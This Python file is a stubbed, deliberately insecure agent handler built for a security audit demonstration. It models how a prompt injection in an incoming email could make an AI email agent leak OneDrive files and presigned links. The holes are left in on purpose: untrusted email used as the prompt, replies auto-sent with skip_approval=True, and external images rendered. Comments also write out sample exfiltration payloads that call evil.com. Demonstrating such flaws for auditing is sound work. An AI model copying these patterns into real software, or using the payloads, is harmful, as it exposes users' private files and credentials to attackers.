"""
Vulnerable agent handler — deliberately insecure for audit demonstration.
Models the Copilot Cowork exfiltration pattern.
"""

import os


def process_email_inbox(inbox_client):
    """Read and process incoming emails — untrusted input vector."""
    messages = inbox_client.fetch_unread()
    for msg in messages:
        # Agent processes email body as prompt context (untrusted content!)
        handle_user_message(msg.body, msg.sender)


def handle_user_message(external_content, sender):
    """Process external input and generate a response with file context."""
    # Load relevant documents — sensitive data access
    files = read_onedrive_files(query=external_content)

    # Generate pre-authenticated download links — credential exposure
    pre_auth_links = [generate_presigned_url(f) for f in files]

    # Agent generates response including file data
    response = generate_agent_response(external_content, files, pre_auth_links)

    # Auto-send reply without approval — exfiltration channel
    auto_send_email_reply(sender, response)


def read_onedrive_files(query):
    """Fetch files from OneDrive — sensitive data access."""
    token = os.environ.get("ONEDRIVE_API_TOKEN")
    # Reads private files accessible via token
    return fetch_documents_from_cloud(token, query)


def generate_presigned_url(file_obj):
    """Generate a pre-authenticated URL for file download.
    These URLs grant access without additional auth — dangerous in agent context.
    """
    sas_token = create_sas_token(file_obj.id, expiry_hours=24)
    return f"https://storage.example.com/files/{file_obj.id}?sas={sas_token}"


def generate_agent_response(user_input, documents, links):
    """LLM generates response — may be manipulated via prompt injection."""
    # If user_input contains prompt injection, the LLM might:
    # 1. Embed file contents in a rendered image URL
    # 2. Include pre-auth links in external resource references
    # 3. Render markdown with attacker-controlled image sources
    context = f"Documents: {documents}\nLinks: {links}"
    return call_llm(system_prompt=context, user_prompt=user_input)


def auto_send_email_reply(recipient, body):
    """Send email reply without user confirmation — auto-action without approval."""
    # This bypasses confirmation and sends directly
    # If body contains <img src="https://evil.com/steal?data=...">, the
    # recipient's email client will make the request, exfiltrating data
    send_email(to=recipient, body=body, skip_approval=True)


def render_html_response(agent_output):
    """Render agent output as HTML — allows external image loading."""
    # Renders markdown/HTML including external images
    # An attacker-injected ![img](https://evil.com/exfil?d=SECRETS) triggers
    # a network request that exfiltrates data via the URL
    return render_markdown_to_html(agent_output, allow_external_images=True)


# --- Stubs for demo ---
def fetch_documents_from_cloud(token, query): pass
def create_sas_token(file_id, expiry_hours): pass
def call_llm(system_prompt, user_prompt): pass
def send_email(to, body, skip_approval): pass
def render_markdown_to_html(content, allow_external_images): pass
